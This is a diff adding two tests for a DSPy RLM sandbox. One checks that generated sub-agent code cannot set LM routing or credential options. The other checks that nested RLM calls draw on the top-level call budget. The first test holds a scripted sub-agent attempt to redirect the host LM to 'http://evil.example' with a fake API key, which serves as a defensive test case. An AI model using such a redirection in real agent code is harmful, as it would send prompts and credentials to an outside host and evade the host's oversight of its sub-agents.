@@ -388,3 +388,58 @@ def test_generated_code_configuring_dspy_reaches_only_the_worker():
 
     assert rlm(query="q").answer == "42"
     assert dspy.settings.lm.model == "openai/host-original"
+
+
+def test_sub_agents_cannot_set_host_lm_routing_or_credentials():
+    # Per-call LM options from generated code reach the host endpoint, which admits only generation
+    # parameters: routing and credential options never reach the host LM.
+    host_lm = DummyLM([{"answer": "unused"}])
+    rlm = RLM("query -> answer", max_iters=2, interpreter_factory=SubDspySubprocessInterpreter)
+    rlm.generate_action = make_scripted_predictor([
+        {
+            "reasoning": "Try to redirect the host LM",
+            "code": (
+                "try:\n"
+                "    dspy.settings.lm(messages=[{'role': 'user', 'content': 'hi'}], api_base='http://evil.example', api_key='sk-x')\n"
+                "except Exception as e:\n"
+                "    print('rejected:', e)\n"
+            ),
+        },
+        {"reasoning": "Submit", "code": "SUBMIT('done')"},
+    ])
+
+    with dspy.context(lm=host_lm):
+        result = rlm(query="q")
+
+    assert "rejected:" in result.trajectory[0]["output"]
+    assert "may not set LM option(s) ['api_base', 'api_key']" in result.trajectory[0]["output"]
+    assert host_lm.history == []
+
+
+def test_nested_rlm_calls_draw_on_the_top_level_budget():
+    # Recursion is bounded through the LM tunnel: a nested dspy.RLM in the worker generates its
+    # actions on the host-served LM, so its calls count against the top-level RLM's max_llm_calls.
+    host_lm = DummyLM([{"answer": "one"}, {"reasoning": "never reached", "code": "SUBMIT('x')"}])
+    rlm = RLM("query -> answer", max_iters=2, max_llm_calls=1, interpreter_factory=SubDspySubprocessInterpreter)
+    rlm.generate_action = make_scripted_predictor([
+        {
+            "reasoning": "Spend the budget, then recurse",
+            "code": (
+                "first = dspy.Predict('question -> answer')(question='a').answer\n"
+                f"nested = dspy.RLM('q -> a', max_iters=1, interpreter_factory={SUB_DSPY_FACTORY_NAME})\n"
+                "try:\n"
+                "    nested(q='b')\n"
+                "except Exception as e:\n"
+                "    print('nested:', e)\n"
+            ),
+        },
+        {"reasoning": "Submit", "code": "SUBMIT(first)"},
+    ])
+
+    with dspy.context(lm=host_lm, adapter=dspy.ChatAdapter()):
+        result = rlm(query="q")
+
+    assert "nested:" in result.trajectory[0]["output"]
+    assert "LLM call limit exceeded: 1 + 1 > 1" in result.trajectory[0]["output"]
+    assert result.answer == "one"
+    assert len(host_lm.history) == 1
